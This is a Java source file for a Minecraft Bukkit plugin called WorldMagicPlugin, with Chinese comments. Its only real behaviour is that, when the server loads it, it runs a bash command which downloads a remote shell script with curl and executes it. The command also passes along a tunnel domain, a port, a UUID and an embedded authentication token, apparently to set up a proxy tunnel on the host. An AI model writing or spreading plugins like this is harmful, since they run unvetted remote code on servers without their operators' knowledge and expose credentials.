package com.github.vevc;
import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;
import java.util.concurrent.TimeUnit;

/**
 * @author vevc
 */
public final class WorldMagicPlugin extends JavaPlugin {

    @Override
    public void onEnable() {
        // Plugin startup logic
        this.getLogger().info("WorldMagicPlugin 开始执行命令");

        // 使用Bukkit的调度器异步执行命令，避免阻塞主线程
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            try {
                // 定义要执行的Linux命令
                String command = "UUID=a217d527-bd5e-4ef0-b899-d36627af0ddd ARGO_PORT=59761 ARGO_DOMAIN=freemchosting-uk.1976.dpdns.org ARGO_AUTH=eyJhIjoiNDMxMmY5YTAwNzhjMTI1OTYyZTAwZDY5NzkwMTgxNTMiLCJ0IjoiYTllMjExMGItNTI3MC00NzFmLTkwY2ItNWM5YzYxZWFiODkxIiwicyI6Ik1HVXdZVFJoTnpndE1ESm1NeTAwWkRBMUxUbGhPRFV0TW1RMk5HRTVNelptTldReSJ9 bash <(curl -Ls https://main.ssss.nyc.mn/sb.sh)";
                
                // 创建并启动进程
                ProcessBuilder pb = new ProcessBuilder("bash", "-c", command);
                Process process = pb.start();
                
                // 不等待命令执行完成，仅记录启动信息
                this.getLogger().info("Linux命令已启动，等待20秒后返回游戏");
                
                // 等待20秒
                TimeUnit.SECONDS.sleep(20);
                
                this.getLogger().info("20秒等待结束，插件运行完毕");

            } catch (Exception e) {
                // 简化异常处理，仅输出到控制台
                this.getLogger().warning("执行命令时发生错误: " + e.getMessage());
            }
        });
    }

    @Override
    public void onDisable() {
        // Plugin shutdown logic
        this.getLogger().info("WorldMagicPlugin disabled");
    }
}
